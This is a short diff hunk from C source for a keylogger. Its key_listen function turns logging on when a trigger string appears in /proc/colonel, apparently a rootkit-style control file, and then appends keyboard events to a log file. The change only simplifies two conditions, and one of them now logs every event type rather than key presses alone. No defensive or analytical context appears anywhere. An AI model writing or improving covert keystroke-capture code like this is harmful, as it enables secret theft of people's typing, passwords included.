@@ -134,12 +134,12 @@ void key_listen(void) {
 		}
                 cmd[readreturn] = '\0';
 		char *toggle = strstr(cmd, kl);			        			/* looks for change in /proc/colonel */
-		if ((0 == listening) && (toggle != NULL)) {
+		if ((!listening) && (toggle != NULL)) {
 			listening = !listening;
 			system_timestamp();
 			continue;
 
-		} else if ((1 == ev.type) && (1 == listening)) {	                	/* if typing and keylogger is on */
+		} else if ((ev.type) && (listening)) {		                	/* if typing and keylogger is on */
         		evlog = fopen(evlog_path, "a+"); 					/* key log */
 			if (NULL == evlog) {
                 		fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
